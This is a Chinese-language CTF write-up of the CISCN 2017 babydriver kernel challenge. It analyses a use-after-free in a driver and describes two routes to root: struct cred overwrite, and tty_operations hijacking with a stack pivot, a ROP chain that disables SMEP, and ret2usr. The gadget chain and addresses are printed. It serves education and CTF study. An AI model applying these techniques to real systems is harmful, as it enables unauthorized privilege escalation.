# linux-kernel-pwn-ciscn2017-babydriver

阅读量 **149564**

发布时间 : 2020-12-15 10:00:18

 **x**

##### 译文声明

本文是翻译文章，文章原作者 平凡路上，文章来源：平凡路上

原文地址：<https://mp.weixin.qq.com/s/HGzihicoSldq4tTO6IQ0JA>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t0142dfcc9c36bdfd7e.jpg)

作者：平凡路上

上一篇文章利用栈溢出介绍了基本的内核中利用rop以及ret2usr来进行提权的两种方式，其中更常用的会是用ret2usr，因为完全使用rop是很费力的一件事情。

为了防止内核执行用户代码导致提权发生的情况的发生，出现了`smep`（Supervisor Mode Execution Protection）机制。

## smep简介

SMAP(Supervisor Mode Access Prevention，管理模式访问保护)和SMEP(Supervisor Mode
Execution
Prevention，管理模式执行保护)的作用分别是禁止内核访问用户空间的数据和禁止内核执行用户空间的代码。arm里面叫PXN(Privilege
Execute Never)和PAN(Privileged Access
Never)。SMEP类似于NX，不过一个是在内核态中，一个是在用户态中；NX一样SMAP/SMEP需要处理器支持。

可以通过cat /proc/cpuinfo查看是否开启了smep：

    
    
    / $ grep smep /proc/cpuinfo
    flags           : fpu vme de pse tsc msr pae mce cx8 apic sep mtrr pge mca cmov pat pse36 clflush mmx fxsr sse sse2 syscall nx lm constant_tsc nopl xtopology pni cx16 x2apic hypervisor smep
    

在qemu中可通过启动脚本查看是否开启了smep：

    
    
    #!/bin/bash
    
    qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -s
    

内核代码中通过cr4寄存器的值来判断系统是否开启了smep，cr4寄存器各个位的含义如下表所示：

bit | label | description  
---|---|---  
0 | vme | virtual 8086 mode extensions  
1 | pvi | protected mode virtual interrupts  
2 | tsd | time stamp disable  
3 | de | debugging extensions  
4 | pse | page size extension  
5 | pae | physical address extension  
6 | mce | machine check exception  
7 | pge | page global enable  
8 | pce | performance monitoring counter enable  
9 | osfxsr | os support for fxsave and fxrstor instructions  
10 | osxmmexcpt | os support for unmasked simd floating point exceptions  
11 | umip | user mode instruction prevention (#GP on SGDT, SIDT, SLDT, SMSW,
and STR instructions when CPL > 0)  
13 | vmxe | virtual machine extensions enable  
14 | smxe | safer mode extensions enable  
17 | pcide | pcid enable  
18 | osxsave | xsave and processor extended states enable  
20 | smep | supervisor mode executions protection enable  
21 | smap | supervisor mode access protection enable  
  
所以如果内核开启了smep的话，能直接想到的就是通过内核中的代码将该位置0，关闭smep后，后面再执行ret2usr就比较方便了。

关闭 smep 保护，常用一个固定值 `0x6f0`，即 `mov cr4, 0x6f0`。可以在内核中寻找能组成 `mov cr4,
0x6f0`的gadget来关闭smep，如下所示：

    
    
    pop rdi; ret;
    0x6f0;
    mov cr4, rdi; pop rbp; ret;
    0
    ret2usr
    

## ciscn2017-babydriver

###  描述

题目下载下来后，查看目录，`boot.sh`是启动脚本，`bzImage`是内核镜像，`rootfs.cpio`是文件系统：

    
    
    $ ll
    -rwxr-xr-x  1 raycp raycp  219 Oct 11 01:09 boot.sh
    -rwxr-xr-x  1 raycp raycp 6.7M Jun 16  2017 bzImage
    -rwxr-xr-x  1 raycp raycp 4.4M Oct 11 06:10 rootfs.cpio
    

启动脚本如下：

    
    
    $ cat boot.sh
    #!/bin/bash
    
    qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append 'console=ttyS0 root=/dev/ram oops=panic panic=1' -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep
    

程序开启了smep，可以在其中加入`-s`以方便调试。

提取文件系统

    
    
    mv rootfs.cpio rootfs.cpio.gz
    gunzip ./rootfs.cpio.gz
    ./extract-cpio.sh
    
    # extract-cpio.sh
    #mkdir cpio
    #cd cpio
    #cp ../$1 ./
    #cpio -idmv < $1
    

进入到文件系统中查看目录：

    
    
    $ ls
    bin  etc  home  init  lib  linuxrc  proc  rootfs.cpio  sbin  sys  tmp  usr
    

查看`init`内容：

    
    
    # raycp @ ubuntu in ~/work/kernel/babydriver/cpio [0:49:45]
    $ cat init
    #!/bin/sh
    
    mount -t proc none /proc
    mount -t sysfs none /sys
    mount -t devtmpfs devtmpfs /dev
    chown root:root flag
    chmod 400 flag
    exec 0</dev/console
    exec 1>/dev/console
    exec 2>/dev/console
    
    insmod /lib/modules/4.4.72/babydriver.ko
    chmod 777 /dev/babydev
    echo -e "\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\n"
    setsid cttyhack setuidgid 1000 sh
    
    umount /proc
    umount /sys
    poweroff -d 0  -f
    

通过`insmod
/lib/modules/4.4.72/babydriver.ko`知道要分析的目标是`babydriver.ko`，同时可以将`setsid
cttyhack setuidgid 1000 sh`改为`setsid cttyhack setuidgid 0 sh`以拿到root权限方便调试。

因为没有linux原始内核镜像`vmlinux`，所以需要使用脚本[extract-vmlinux](https://github.com/torvalds/linux/blob/master/scripts/extract-vmlinux)从bzImage中提取出`vmlinux`：

    
    
    ./extract-vmlinux ./bzImage > vmlinux
    

接下来对ko进行分析。

###  漏洞分析

将babydriver.ko拖入ida，在进行分析之前也可以执行`ropper --file ./vmlinux --nocolor >
ropgadget.txt`将gadget提取出来，因为该过程需要不少时间。

    
    
    $ checksec babydriver.ko
    [*] '/home/raycp/work/kernel/babydriver/babydriver.ko'
        Arch:     amd64-64-little
        RELRO:    No RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x0)
    

`babydriver_init`实现了一个标准的[设备驱动](https://blog.csdn.net/zqixiao_09/article/details/50839042)，主要分析目标在于`fops`中的函数指针。

模块中存在一个全局变量`babydev_struct`，其定义如下：

    
    
    00000000 babydevice_t    struc ; (sizeof=0x10, align=0x8, copyof_429)
    00000000                                         ; XREF: .bss:babydev_struct/r
    00000000 device_buf      dq ?                    ; XREF: babyrelease+6/r
    00000000                                         ; babyopen+26/w ... ; offset
    00000008 device_buf_len  dq ?                    ; XREF: babyopen+2D/w
    00000008                                         ; babyioctl+3C/w ...
    00000010 babydevice_t    ends
    

`babyopen`函数代码如下：

    
    
    int __fastcall babyopen(inode *inode, file *filp)
    {
      __int64 v2; // rdx
    
      _fentry__(inode, filp);
      babydev_struct.device_buf = (char *)kmem_cache_alloc_trace(kmalloc_caches[6], 37748928LL, 64LL);
      babydev_struct.device_buf_len = 0x40LL;
      printk("device open\n", 37748928LL, v2);
      return 0;
    }
    

申请了0x40大小的堆空间到`device_buf`中，并将长度到`device_buf_len`中。

`babyrelease`函数则是释放`device_buf`指向的空间：

    
    
    int __fastcall babyrelease(inode *inode, file *filp)
    {
      __int64 v2; // rdx
    
      _fentry__(inode, filp);
      kfree(babydev_struct.device_buf);
      printk("device release\n", filp, v2);
      return 0;
    }
    

`babywrite`函数的功能是如果用户数据长度不大于该空间长度，则往该空间中写入相应用户数据。

    
    
    ssize_t __fastcall babywrite(file *filp, const char *buffer, size_t length, loff_t *offset)
    {
      size_t v4; // rdx
      ssize_t result; // rax
      ssize_t v6; // rbx
    
      _fentry__(filp, buffer);
      if ( !babydev_struct.device_buf )
        return -1LL;
      result = -2LL;
      if ( babydev_struct.device_buf_len > v4 )
      {
        v6 = v4;
        copy_from_user();
        result = v6;
      }
      return result;
    }
    

`babyread`函数的功能则是用户若读取的数据长度不大于空间长度，将数据读取到用户空间。

    
    
    ssize_t __fastcall babyread(file *filp, char *buffer, size_t length, loff_t *offset)
    {
      size_t v4; // rdx
      ssize_t result; // rax
      ssize_t v6; // rbx
    
      _fentry__(filp, buffer);
      if ( !babydev_struct.device_buf )
        return -1LL;
      result = -2LL;
      if ( babydev_struct.device_buf_len > v4 )
      {
        v6 = v4;
        copy_to_user(buffer);
        result = v6;
      }
      return result;
    

`babyioctl`提供了申请指定大小的堆空间的能力。

    
    
    __int64 __fastcall babyioctl(file *filp, unsigned int command, unsigned __int64 arg)
    {
      size_t v3; // rdx
      size_t len; // rbx
      __int64 v5; // rdx
      __int64 result; // rax
    
      _fentry__(filp, *(_QWORD *)&command);
      len = v3;
      if ( command == 0x10001 )
      {
        kfree(babydev_struct.device_buf);
        babydev_struct.device_buf = (char *)_kmalloc(len, 0x24000C0LL);
        babydev_struct.device_buf_len = len;
        printk("alloc done\n", 0x24000C0LL, v5);
        result = 0LL;
      }
      else
      {
        printk(&unk_2EB, v3, v3);
        result = -22LL;
      }
      return result;
    }
    

按照用户空间的pwn题的思路好像是没什么问题的，但是这个设备存在于内核空间当中，这样的实现就会导致形成`uaf`漏洞。

因为内核空间是所有进程都共享内存，如果打开了两个设备，会导致两个设备都对同一个全局指针`babydev_struct`具备相应的读写能力。若将其中一个关闭，内存会被释放。由于全局指针未清0，另一个设备仍然可以对该内存进行读写，导致形成`uaf`漏洞。

## 漏洞利用

利用这个uaf漏洞，存在两种利用方法：

  * 利用uaf直接修改进程的`struct cred`实现提权。
  * 利用uaf修改结构体函数指针，控制程序流进行提权。

首先解释第一种解法，`struct cred`结构体如下：

    
    
    struct cred {
        atomic_t    usage;
    #ifdef CONFIG_DEBUG_CREDENTIALS
        atomic_t    subscribers;    /* number of processes subscribed */
        void        *put_addr;
        unsigned    magic;
    #define CRED_MAGIC  0x43736564
    #define CRED_MAGIC_DEAD 0x44656144
    #endif
        kuid_t      uid;        /* real UID of the task */
        kgid_t      gid;        /* real GID of the task */
        kuid_t      suid;       /* saved UID of the task */
        kgid_t      sgid;       /* saved GID of the task */
        kuid_t      euid;       /* effective UID of the task */
        kgid_t      egid;       /* effective GID of the task */
        kuid_t      fsuid;      /* UID for VFS ops */
        kgid_t      fsgid;      /* GID for VFS ops */
        unsigned    securebits; /* SUID-less security management */
        kernel_cap_t    cap_inheritable; /* caps our children can inherit */
        kernel_cap_t    cap_permitted;  /* caps we're permitted */
        kernel_cap_t    cap_effective;  /* caps we can actually use */
        kernel_cap_t    cap_bset;   /* capability bounding set */
        kernel_cap_t    cap_ambient;    /* Ambient capability set */
    #ifdef CONFIG_KEYS
        unsigned char   jit_keyring;    /* default keyring to attach requested
                         * keys to */
        struct key __rcu *session_keyring; /* keyring inherited over fork */
        struct key  *process_keyring; /* keyring private to this process */
        struct key  *thread_keyring; /* keyring private to this thread */
        struct key  *request_key_auth; /* assumed request_key authority */
    #endif
    #ifdef CONFIG_SECURITY
        void        *security;  /* subjective LSM security */
    #endif
        struct user_struct *user;   /* real user ID subscription */
        struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */
        struct group_info *group_info;  /* supplementary groups for euid/fsgid */
        struct rcu_head rcu;        /* RCU deletion hook */
    } __randomize_layout;
    

每个进程对应于一个`struct cred`结构体，该结构体中的`uid`、`gid`等记录了进程的权限，如果可以将其修改为0，便实现了提权。

`struct cred`大小为`0xa8`（可数源码或编译一个带符号的内核进行查看）。

具体的利用步骤如下：

  1. 调用`babyopen`打开两个`babydev`设备，它们的`babydev_struct.device_buf`指向同一块内存。
  2. 调用`babyioctl`将申请大小为0xa8的内存空间。
  3. `babyrelease`释放其中一个`babydev`设备，`device_buf`被释放，但另一个`babydev`设备仍然对该空间具备读写能力。
  4. `fork`创建一个新的进程，内核会为其分配一个`struct cred`，为上面的刚刚释放的空间，所以未关闭的`babydev`拥有对这个`struct cred`空间写数据的能力。
  5. `babywrite`将0数据写到`uid`、`gid`、`suid`、`sgid`、`euid`、`egid`等字段，进行提权，返回后创建root shell。

另一个解法则是利用uaf修改结构体函数指针，实现控制程序执行流，最终实现提权。

具体的做法是利用`struct tty_struct`结构体以及`struct tty_operations`结构体，两个结构体定义如下。

`struct tty_struct`结构体定义：

    
    
    struct tty_struct {
        int magic;
        struct kref kref;
        struct device *dev;
        struct tty_driver *driver;
        const struct tty_operations *ops;
        int index;
        /* Protects ldisc changes: Lock tty not pty */
        struct ld_semaphore ldisc_sem;
        struct tty_ldisc *ldisc;
        struct mutex atomic_write_lock;
        struct mutex legacy_mutex;
        struct mutex throttle_mutex;
        struct rw_semaphore termios_rwsem;
        struct mutex winsize_mutex;
        spinlock_t ctrl_lock;
        spinlock_t flow_lock;
        /* Termios values are protected by the termios rwsem */
        struct ktermios termios, termios_locked;
        struct termiox *termiox;    /* May be NULL for unsupported */
        char name[64];
        struct pid *pgrp;       /* Protected by ctrl lock */
        struct pid *session;
        unsigned long flags;
        int count;
        struct winsize winsize;     /* winsize_mutex */
        unsigned long stopped:1,    /* flow_lock */
                  flow_stopped:1,
                  unused:BITS_PER_LONG - 2;
        int hw_stopped;
        unsigned long ctrl_status:8,    /* ctrl_lock */
                  packet:1,
                  unused_ctrl:BITS_PER_LONG - 9;
        unsigned int receive_room;  /* Bytes free for queue */
        int flow_change;
        struct tty_struct *link;
        struct fasync_struct *fasync;
        wait_queue_head_t write_wait;
        wait_queue_head_t read_wait;
        struct work_struct hangup_work;
        void *disc_data;
        void *driver_data;
        spinlock_t files_lock;      /* protects tty_files list */
        struct list_head tty_files;
    #define N_TTY_BUF_SIZE 4096
        int closing;
        unsigned char *write_buf;
        int write_cnt;
        /* If the tty has a pending do_SAK, queue it here - akpm */
        struct work_struct SAK_work;
        struct tty_port *port;
    } __randomize_layout;
    

`struct tty_operations`定义：

    
    
    struct tty_operations {
        struct tty_struct * (*lookup)(struct tty_driver *driver,
                struct file *filp, int idx);
        int  (*install)(struct tty_driver *driver, struct tty_struct *tty);
        void (*remove)(struct tty_driver *driver, struct tty_struct *tty);
        int  (*open)(struct tty_struct * tty, struct file * filp);
        void (*close)(struct tty_struct * tty, struct file * filp);
        void (*shutdown)(struct tty_struct *tty);
        void (*cleanup)(struct tty_struct *tty);
        int  (*write)(struct tty_struct * tty,
                  const unsigned char *buf, int count);
        int  (*put_char)(struct tty_struct *tty, unsigned char ch);
        void (*flush_chars)(struct tty_struct *tty);
        int  (*write_room)(struct tty_struct *tty);
        int  (*chars_in_buffer)(struct tty_struct *tty);
        int  (*ioctl)(struct tty_struct *tty,
                unsigned int cmd, unsigned long arg);
        long (*compat_ioctl)(struct tty_struct *tty,
                     unsigned int cmd, unsigned long arg);
        void (*set_termios)(struct tty_struct *tty, struct ktermios * old);
        void (*throttle)(struct tty_struct * tty);
        void (*unthrottle)(struct tty_struct * tty);
        void (*stop)(struct tty_struct *tty);
        void (*start)(struct tty_struct *tty);
        void (*hangup)(struct tty_struct *tty);
        int (*break_ctl)(struct tty_struct *tty, int state);
        void (*flush_buffer)(struct tty_struct *tty);
        void (*set_ldisc)(struct tty_struct *tty);
        void (*wait_until_sent)(struct tty_struct *tty, int timeout);
        void (*send_xchar)(struct tty_struct *tty, char ch);
        int (*tiocmget)(struct tty_struct *tty);
        int (*tiocmset)(struct tty_struct *tty,
                unsigned int set, unsigned int clear);
        int (*resize)(struct tty_struct *tty, struct winsize *ws);
        int (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);
        int (*get_icount)(struct tty_struct *tty,
                    struct serial_icounter_struct *icount);
        void (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);
    #ifdef CONFIG_CONSOLE_POLL
        int (*poll_init)(struct tty_driver *driver, int line, char *options);
        int (*poll_get_char)(struct tty_driver *driver, int line);
        void (*poll_put_char)(struct tty_driver *driver, int line, char ch);
    #endif
        int (*proc_show)(struct seq_file *, void *);
    } __randomize_layout;
    

利用uaf，控制`struct tty_struct`结构体，将该结构体中的第五个字段`const struct tty_operations
*ops`指向到我们伪造的`struct tty_operations`结构体。

`struct
tty_operations`结构体中的函数指针则是对应于相应的函数，如在用户空间调用write对该设备进行操作，最终会调用到该结构体中的`int
(*write)(struct tty_struct * tty, const unsigned char *buf, int count);`函数。

`struct tty_struct`结构体大小为`0x2e0`，打开tty设备会创建该结构体，我们可以创建`ptmx`设备实现`struct
tty_struct`结构体的创建。ptmx设备是tty设备的一种，当使用open函数打开时，通过系统调用进入内核，创建新的文件结构体，最终创建`struct
tty_struct`结构体。

将该结构体中的`ops`指针指向伪造的`const struct
tty_operations`结构体，实现在对该设备进行操作时调用相应的函数指针时，实现程序流的控制。

可以选择对设备进行`write`操作，修改`const struct tty_operations`结构体的`write`函数指针实现控制流的劫持。

能够劫持控制流后，需要做的操作包括关闭smep；ret2usr提权；返回到用户空间创建root shell。

在执行到write函数指针时，rax是指向`const struct tty_operations`结构体的，所以可以先stack
pivot来进行rop。能够进行stack pivot的gadget有两条，一条是`xchg esp, eax`；一条是`mov rsp,
rax`。第一条需要mmap一个空间，实现stack
pivot；第二个则不需要，而且第二条gadget还是两条指令的拼接，很有意思，所以在这里选择第二条gadget来进行stack pivot。

`mov rsp,rax ; dec ebx ; ret`指令的地址是`0xFFFFFFFF8181BFC5`，该地址的指令实际上是：

    
    
    pwndbg> x/3i 0xFFFFFFFF8181BFC5
       0xffffffff8181bfc5:  mov    rsp,rax
       0xffffffff8181bfc8:  dec    ebx
       0xffffffff8181bfca:  jmp    0xffffffff8181bf7e
    pwndbg> x/3i 0xffffffff8181bf7e
       0xffffffff8181bf7e:  ret
    

可以看到该gadget是由两条指令拼接成的`mov rsp,rax ; dec ebx ;
ret`指令，所以一开始我在`ropper`以及`ropgadget`导出来的gadget中都没有找到该指令，经过请教`V1NKe`师傅，知道了是用IDA找到的，师傅还是强。

在进行了stack
pivot后，就比较容易了，首先利用两条gadget关闭smep；可以执行用户空间代码后，ret2usr进行提权；最终返回到用户空间创建root
shell。最终的gadget链如下：

    
    
    uint64_t fake_tty_operations[30] = {
            prdi_ret,
            0x6f0,
            mov_cr4_rdi_p_ret,
            0,
            ret,
            ret,
            prdi_ret,
            mov_rsp_rax_ret,
            (uint64_t)privilege_escalate,
            swapgs_p_ret,
            0,
            iretq_ret,
            (uint64_t)root_shell,
            user_cs,
            user_rflags,
            user_sp,
            user_ss
        };
    

## 小结

对待问题还是要找寻本质，理清思路，解决问题。

相关脚本及文件[链接](https://github.com/ray-cp/linux_kernel_pwn/tree/master/ciscn2017_babydriver)

## 参考链接

  1. [linux漏洞缓解机制介绍](https://bbs.pediy.com/thread-226696.htm)
  2. [Linux 字符设备驱动结构（一）—— cdev 结构体、设备号相关知识解析](https://blog.csdn.net/zqixiao_09/article/details/50839042)
  3. [Linux Pwn技巧总结_1](https://xz.aliyun.com/t/4529#toc-18)
  4. [【KERNEL PWN】CISCN 2017 babydriver题解](http://p4nda.top/2018/10/11/ciscn-2017-babydriver/)

本文翻译自平凡路上 [原文链接](https://mp.weixin.qq.com/s/HGzihicoSldq4tTO6IQ0JA)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **平凡路上** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/225447](/post/id/225447)

安全客 - 有思想的安全新媒体

本文转载自: [平凡路上](https://mp.weixin.qq.com/s/HGzihicoSldq4tTO6IQ0JA)

如若转载,请注明出处： <https://mp.weixin.qq.com/s/HGzihicoSldq4tTO6IQ0JA>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)

 **+1** __2赞

 __收藏

![](https://p5.ssl.qhimg.com/t010857340ce46bb672.jpg) 平凡路上

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

